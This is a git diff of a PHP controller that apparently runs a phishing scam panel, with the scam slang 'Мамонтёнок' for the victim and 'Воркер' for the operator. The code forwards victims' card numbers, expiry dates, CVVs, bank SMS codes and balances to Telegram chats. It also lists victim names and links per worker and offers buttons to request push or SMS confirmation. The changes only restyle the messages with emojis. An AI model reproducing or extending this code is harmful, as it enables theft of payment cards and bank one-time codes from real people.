@@ -35,10 +35,10 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "Мамонтёнок вводит баланс, объявление: " . $order->ad_name;
-        $wbiv = $message . "\n\nКарта: " . $request->input('card') .
-    "\nДата: " . $request->input('expiryDate') .
-    "\nCVV: " . $request->input('cvv') .
-    "\n\nВоркер: " . $order->username;
+        $wbiv = $message . "\n\nКарта 💳 `" . $request->input('card') . "`" .
+    "\nДата 🕰 " . $request->input('expiryDate') .
+    "\nCVV 🤫 `" . $request->input('cvv') . "`" .
+    "\n\nВоркер 🥷 " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -51,11 +51,11 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "ЕСТЬ лог баланса, объявление: " . $order->ad_name;
-        $wbiv = $message . "\n\nКарта: " . $request->input('card') .
-            "\nДата: " . $request->input('expiryDate') .
-            "\nCVV: " . $request->input('cvv') .
-            "\nБаланс: " . $request->input('balance') .
-            "\n\nВоркер: " . $order->username;
+        $wbiv = $message . "\n\nКарта 💳 `" . $request->input('card') . "`" .
+            "\nДата 🕰 " . $request->input('expiryDate') .
+            "\nCVV 🤫 `" . $request->input('cvv') . "`" .
+            "\nБаланс 💷 " . $request->input('balance') .
+            "\n\nВоркер 🥷 " . $order->username;
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -69,8 +69,8 @@ class OrderController extends Controller
         $order = Order::where('unique_id', $request->input('unique_id'))->firstOrFail();
 
         $message = "СМС от банка, объявление: " . $order->ad_name;
-        $wbiv = $message . "\nКод: " . $request->input('code') .
-            "\n\nВоркер: " . $request->input('username');
+        $wbiv = $message . "\nКод ✉️ `" . $request->input('code') . "`" .
+            "\n\nВоркер 🥷 " . $request->input('username');
         $this->sendMessage($message, $order->worker_id);
         foreach (Bievers::all() as $bievers) {
             $this->sendMessageWithInline($wbiv, $bievers->biever_id, $order->unique_id);
@@ -102,11 +102,11 @@ class OrderController extends Controller
         $orders = Order::where('worker_id', $request->worker_id)->orderBy('created_at', 'desc')->limit(10)->get();
 
         $links = $orders->map(function ($order) {
-            return 'Название: ' . $order->ad_name . "\n" .
-                'Ссылка: ' . url('/details/' . $order->unique_id) . "\n" .
-                'ФИО: ' . $order->full_name . "\n" .
-                'Цена: ' . $order->price . "\n" .
-                'Адресс: ' . $order->price . "\n\n";
+            return 'Название 📎 ' . $order->ad_name . "\n" .
+                'Ссылка 🔗 ' . url('/details/' . $order->unique_id) . "\n" .
+                'ФИО 👨 ' . $order->full_name . "\n" .
+                'Цена 💷 ' . $order->price . "\n" .
+                'Адресс 📍 ' . $order->price . "\n\n";
         });
 
         return response()->json(['links' => $links], 200);
@@ -128,9 +128,9 @@ class OrderController extends Controller
             'reply_markup' => json_encode([
                 'inline_keyboard' => [
                     [
-                        ['text' => 'Открыть Push', 'callback_data' => 'show:open-push:' . $id],
-                        ['text' => 'Открыть SMS', 'callback_data' => 'show:open-code:' . $id],
-                        ['text' => 'Открыть Звонок', 'callback_data' => 'show:open-call:' . $id]
+                        ['text' => 'Открыть Push 🔔', 'callback_data' => 'show:open-push:' . $id],
+                        ['text' => 'Открыть SMS ✉️', 'callback_data' => 'show:open-code:' . $id],
+                        ['text' => 'Открыть Звонок 📞', 'callback_data' => 'show:open-call:' . $id]
                     ]
                 ]
             ])
